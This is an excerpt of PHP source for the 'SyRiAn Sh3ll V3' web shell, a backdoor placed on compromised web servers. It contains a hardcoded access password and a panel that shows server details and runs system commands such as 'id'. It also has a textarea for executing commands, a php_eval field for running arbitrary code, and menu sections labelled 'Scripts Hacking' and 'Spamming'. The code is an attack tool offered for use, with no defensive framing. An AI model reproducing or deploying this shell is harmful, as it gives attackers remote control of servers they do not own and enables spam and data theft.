...
$pass = '4l4qs4br1g4d3';  // Password
$shellColor = '#990000'; // Shell Color
#------------------------------------#
#		Powered By attila Shell      #
#		By attila	             #
#		wWw.batakan.com              #
#		Version 3                    #
#		Made In Indonesia            #
...
function footer()
{
	...
	<font color="gray">C0D3D By</font><font color="#990000">&nbsp; ~~ [ </font>
	<font color="gray">EH SyRiAn_34G13</font><font color="#990000"> ] ~~ [
	</font><font color="gray">sy34@msn.com</font><font color="#990000"> ]
	~~ [
	</font><font color="gray">www.syrian-shell.com</font><font color="#990000"> ]
	</font></b>
	</td>
	</tr></table>
	</tbody></table>
...
function CSS($shellColor)
{
	...
	<html dir=rtl>
	<head>
	<title>SyRiAn Sh3ll ~ V3~ [ B3 Cr34T!V3 Or D!3 TRy!nG ]</title>
...
<div align=center><img src='http://pix.avaxnews.com/avaxnews/68/1f/00001f68_medium.jpeg'><br>
</div>
...
<img border=0 src=http://www.syrian-shell.com/eagle.jpg width=101 height=93>&nbsp;</b></font><div
dir=ltr align=center><span style=height: 25px;><b>
<font size=4 color=#FF0000>SyRi</font><font size=4 color=#008000>An Sh</font><font size=4 color=#999999>3ll<br>V3</font></b><span style=font-size: 20pt; color: #990000><p></p></span></span></div></td><td
bgcolor=#000000>
<p dir=ltr><font  size=1>&nbsp; <b>[<a href=?id=mainPage>Main</a>]</b></span>
<font color=black></span></font><b>[</span><a href=?id=scriptsHack>Scripts Hacking</a>]</b></span>
<b>[</span><a href=?id=spamming>Spamming</a>]</b></span>
...
&nbsp;   Server IP = <sy><a href='http://bing.com/search?q=ip:".$serverIP."&go=&form=QBLH&filt=all' target=\"_blank\">".gethostbyname($_SERVER["HTTP_HOST"])." </sy></a>
...
<br>&nbsp;&nbsp;".$uname." <sy><a href=http://www.google.com/search?q=".urlencode(@php_uname())." target=_blank>[Google]</a></sy><br>&nbsp;&nbsp;".$dir."<br>&nbsp;&nbsp;".Exe('id')."</b>
</font></td></tr></tbody>
</table>
&nbsp;&nbsp;[<a href='#down'>Down</a>]
...
if ($_GET['id']== 'mainPage')
{
	...
	<textarea name='ExecutionArea' rows=20 cols=152 style='color=red'>";
...
column-name : emailAddress ";
	...
	<input type='text' name='php_eval' size='70' value='echo \"SyRiAn Sh3ll V3\";'> 
